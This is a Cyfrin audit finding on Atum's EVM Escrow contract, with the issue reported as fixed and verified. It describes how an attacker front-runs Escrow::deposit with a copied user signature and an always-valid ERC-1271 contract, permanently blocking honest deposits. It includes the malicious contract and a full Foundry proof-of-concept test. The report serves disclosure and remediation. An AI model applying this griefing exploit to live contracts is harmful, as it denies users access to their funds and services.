---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-08-14-cyfrin-atum-evm-contracts-v2-0-1-0
ingested_at: '2026-09-27T10:10:51Z'
protocol_category: []
published_at: '2025-08-14T00:00:00Z'
related_swc: []
severity: High
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-08-14-cyfrin-atum-evm-contracts-v2.0.md
tags:
- firm:cyfrin
- report:2025-08-14-cyfrin-atum-evm-contracts-v2-0
title: Permissionless attacker can permanently grief all honest users at the cost
  of 1 wei per user request
vuln_class: []
---

# Permissionless attacker can permanently grief all honest users at the cost of 1 wei per user request

_Section severity (from Solodit section header): High_  
_Audit firm: Cyfrin_  
_Source report: [2025-08-14-cyfrin-atum-evm-contracts-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-08-14-cyfrin-atum-evm-contracts-v2.0.md)_

---

**Description:** In the off-chain part of the protocol, the `Deposit Signature` is publicly available from the beginning when honest users request a quote. Anyone can call `Escrow::deposit` before/during/after bidding as they prefer; there should be no DoS attack possible by calling `Escrow::deposit`.

However there is an attack which allows a permissionless attacker to prevent all honest users from having their quotes fulfilled, effectively bricking the protocol.

**Proof of Concept:**
1. Attacker deploys malicious contract `AttackerContract` that always returns valid magic number in function `isValidSignature`
2. When an honest user submits a request for quote to the auction and their `Deposit Signature` is publicly available, Attacker immediately calls `Escrow::deposit` with:
* `depositor = address(AttackerContract)` (not the real user!)
* `permit.permitted.amount = 1 wei` (modified!)
* Original user's signature (copied from RFQ)
3. `Escrow::deposit` calculates the `depositId` based only upon the input `signature` (which is the user's legitimate signature) and then creates a record in `s_activeDeposits` using this `depositId`:
```solidity
depositId = keccak256(signature);

s_activeDeposits[depositId] = DepositInfo({
    depositor: depositor,
    token: permit.permitted.token,
    amount: permit.permitted.amount,
    reserver: witness.reserver,
    releaser: witness.releaser,
    settler: address(0)
});
```
4. `Permit2` ends up calling `SignatureVerification::verify` which:
* Sees `claimedSigner` (depositor) is a contract
* Calls `AttackerContract.isValidSignature`
* Attacker's contract says "yes valid!"
* Permit2 accepts it; attacker transfers 1 wei to `Escrow` contract
5. The auction continues and the honest user selects a winner. The winner attempts to call `Escrow::deposit` but it reverts at this line:
```solidity
require(s_activeDeposits[depositId].depositor == address(0), Escrow_DepositAlreadyExists(depositId));
```

No honest user requests can ever be fulfilled; the attacker can permanently grief all users requesting quotes at the cost of 1 wei per quote. Even if there was a minimum amount enforced, the attacker could set themselves as the `releaser` to later be able to claim a refund once the honest user's signature had expired.

In `test/Escrow.depositFlow.t.sol`, first add the malicious contract before the definition of `EscrowDepositTest` begins:
```solidity
contract MaliciousERC1271 {
    // Always return valid signature regardless of actual validity
    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return 0x1626ba7e; // IERC1271.isValidSignature.selector
    }
}
```

Then in the same file inside `EscrowDepositTest` add the test function:
```solidity
function test_attacker_griefs_deposits_via_erc1271_bypass() public {
    // Setup: Honest user prepares their deposit
    (
        ISignatureTransfer.PermitTransferFrom memory permit,
        ISignatureTransfer.SignatureTransferDetails memory transferDetails,
        IEscrow.DepositWitness memory depositWitness
    ) = _setup_permit_transferDetails_witness(
        REQUEST_ID, address(s_token), DEPOSIT_AMOUNT, address(s_escrow), reserver, releaser, 0
    );

    // Honest user signs with their EOA
    bytes memory honestUserSignature = _setup_signature(
        permit,
        depositWitness,
        s_permit2,
        address(s_escrow),
        depositorPrivateKey
    );

    // @audit ATTACK BEGINS: Attacker deploys malicious ERC1271 contract
    MaliciousERC1271 attackerContract = new MaliciousERC1271();

    // @audit Attacker modifies the permit amount to 1 wei
    permit.permitted.amount = 1;

    // @audit Give attacker contract 1 wei to execute the attack
    s_token.mint(address(attackerContract), 1);
    vm.prank(address(attackerContract));
    s_token.approve(address(s_permit2), 1);

    // @audit Track balances before attack
    uint256 attackerBalanceBefore = s_token.balanceOf(address(attackerContract));
    uint256 escrowBalanceBefore = s_token.balanceOf(address(s_escrow));

    // @audit Attacker calls deposit using:
    // - Their malicious contract as depositor
    // - Modified permit with 1 wei
    // - Honest user's original signature (which doesn't match!)
    vm.prank(address(attackerContract));
    bytes32 depositId = s_escrow.deposit(
        permit,
        ISignatureTransfer.SignatureTransferDetails({
            to: address(s_escrow),
            requestedAmount: 1  // Only 1 wei
        }),
        address(attackerContract),  // Attacker contract as depositor
        depositWitness,
        honestUserSignature  // Using honest user's signature!
    );

    // @audit Attack succeeds! Only 1 wei was transferred
    assertEq(
        s_token.balanceOf(address(attackerContract)),
        attackerBalanceBefore - 1,
        "Attacker only spent 1 wei"
    );
    assertEq(
        s_token.balanceOf(address(s_escrow)),
        escrowBalanceBefore + 1,
        "Escrow only received 1 wei"
    );

    // @audit Deposit was created with attacker as depositor
    IEscrow.DepositInfo memory depositInfo = s_escrow.getDepositInfo(depositId);
    assertEq(depositInfo.depositor, address(attackerContract), "Attacker is depositor");
    assertEq(depositInfo.amount, 1, "Only 1 wei recorded");

    // @audit NOW: Honest user tries to make their legitimate deposit
    // Reset permit amount to original
    permit.permitted.amount = DEPOSIT_AMOUNT;

    // Give honest depositor their tokens
    s_token.mint(depositor, DEPOSIT_AMOUNT);
    vm.prank(depositor);
    s_token.approve(address(s_permit2), DEPOSIT_AMOUNT);

    // @audit Honest user's deposit will REVERT because depositId already exists!
    vm.prank(depositor);
    vm.expectRevert(
        abi.encodeWithSelector(
            IEscrow.Escrow_DepositAlreadyExists.selector,
            depositId  // Same depositId because it's keccak256(signature)
        )
    );
    s_escrow.deposit(
        permit,
        ISignatureTransfer.SignatureTransferDetails({
            to: address(s_escrow),
            requestedAmount: DEPOSIT_AMOUNT
        }),
        depositor,  // Real depositor
        depositWitness,
        honestUserSignature  // Same signature
    );

    // @audit IMPACT:
    // - Attacker griefed honest user's deposit for just 1 wei
    // - Honest user cannot deposit their funds
    // - RFQ process is completely broken
    // - Attacker can repeat this for EVERY public RFQ
}
```

**Recommended Mitigation:** Calculate `depositId` based on the hash of the signature and the `depositor` address.

**Atum:**
Fixed in commit [6e4abe4](https://github.com/Atum-Labs/evm-contracts/commit/6e4abe4f18719b8769cbc45bd207600a58c8b03d).

**Cyfrin:** Verified.

\clearpage
